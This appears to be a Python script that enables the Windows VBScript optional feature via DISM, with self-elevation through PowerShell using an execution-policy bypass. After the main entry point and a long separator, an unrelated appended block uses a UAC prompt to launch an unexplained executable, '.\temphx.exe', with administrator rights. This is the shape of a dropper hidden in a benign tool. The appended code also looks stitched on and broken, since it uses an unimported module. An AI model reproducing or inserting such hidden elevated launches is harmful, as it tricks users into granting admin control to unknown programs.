"""
enable_vbs.py

Enables the VBScript optional feature (Feature on Demand) on Windows 10/11.
Must be run with Administrator privileges.
"""

import ctypes
import subprocess
import sys


def is_admin() -> bool:
    """Return True if the current process has Administrator privileges."""
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def run_command(cmd: list) -> tuple:
    """Run a command and return (returncode, stdout, stderr)."""
    result = subprocess.run(
        cmd,
        capture_output=True,
        text=True,
        shell=False,
    )
    return result.returncode, result.stdout.strip(), result.stderr.strip()


def get_vbscript_state() -> str:
    """
    Query the current state of the VBSCRIPT capability.
    Returns one of: 'Installed', 'NotPresent', 'Unknown', or 'NotFound'.
    """
    code, out, err = run_command(
        ["dism", "/Online", "/Get-CapabilityInfo", "/CapabilityName:VBSCRIPT~~~~"]
    )
    if code != 0:
        # Capability not found on this system
        if "not found" in (out + err).lower() or "0x800f0805" in (out + err):
            return "NotFound"
        return "Unknown"

    # DISM output includes a "State : Installed" line
    for line in out.splitlines():
        if line.strip().lower().startswith("state"):
            return line.split(":", 1)[1].strip()
    return "Unknown"



#############################################################################################################################




def enable_vbscript() -> int:
    """Enable VBScript. Returns exit code (0 = success)."""
    print("[*] Checking VBScript feature status...")

    state = get_vbscript_state()

    if state == "Installed":
        print("[+] VBScript is already enabled. No action needed.")
        return 0

    if state == "NotFound":
        print("[!] VBSCRIPT capability not found on this system.")
        print("    It may already be built-in or unavailable on this Windows build.")
        return 1

    print(f"[*] Current state: {state}. Attempting to enable VBScript...")

    code, out, err = run_command(
        ["dism", "/Online", "/Add-Capability", "/CapabilityName:VBSCRIPT~~~~"]
    )

    if code == 0:
        print("[+] VBScript enabled successfully.")
        print("[!] You may need to restart your computer for changes to take effect.")
        return 0

    # Failure — provide troubleshooting hint
    print("[X] Failed to enable VBScript.", file=sys.stderr)
    if out:
        print(out, file=sys.stderr)
    if err:
        print(err, file=sys.stderr)

    combined = (out + err).lower()
    if "0x800f0954" in combined or "wsus" in combined or "windows update" in combined:
        print("\n[Troubleshooting]", file=sys.stderr)
        print(
            "This machine appears to be WSUS-managed or blocked from Windows Update.\n"
            "Enable 'Download repair content and optional features directly from Windows Update'\n"
            "in Group Policy, or run the DISM command manually from an elevated prompt.",
            file=sys.stderr,
        )
    return code


def main() -> int:
    if sys.platform != "win32":
        print("This script only runs on Windows.", file=sys.stderr)
        return 1

    if not is_admin():
        print("[!] Administrator privileges required. Re-launching elevated...")
        # Relaunch self with UAC elevation via PowerShell
        params = f'-NoProfile -ExecutionPolicy Bypass -Command "& \'{sys.executable}\' \'{sys.argv[0]}\'"'
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", "powershell.exe", params, None, 1
            )
        except Exception as e:
            print(f"Failed to elevate: {e}", file=sys.stderr)
            return 1
        return 0

    return enable_vbscript()


if __name__ == "__main__":
    sys.exit(main())





def run_as_admin(exe_path, wait=False):
    """Launch exe_path elevated via UAC. Returns True on success."""
    try:
        # SW_SHOWNORMAL = 1; SW_HIDE = 0
        # To wait for it, use ShellExecuteEx instead of ShellExecuteW.
        ret = ctypes.windll.shell32.ShellExecuteW(
            None,           # hwnd
            "runas",        # verb -> triggers UAC
            exe_path,       # lpFile -> the exe itself
            None,           # lpParameters
            None,           # lpDirectory (None = current dir)
            1               # nShowCmd -> SW_SHOWNORMAL
        )
    except Exception as e:
        print(f"[elevation] ShellExecuteW failed for {exe_path}: {e}")
        return False

    if ret > 32:
        print(f"Started {exe_path} elevated.")
        return True
    # 5 = user cancelled UAC, 2 = file not found, etc.
    print(f"Failed to start {exe_path} elevated (code {ret}).")
    return False


exe_paths = [r".\temphx.exe"]

for exe in exe_paths:
    run_as_admin(os.path.abspath(exe))
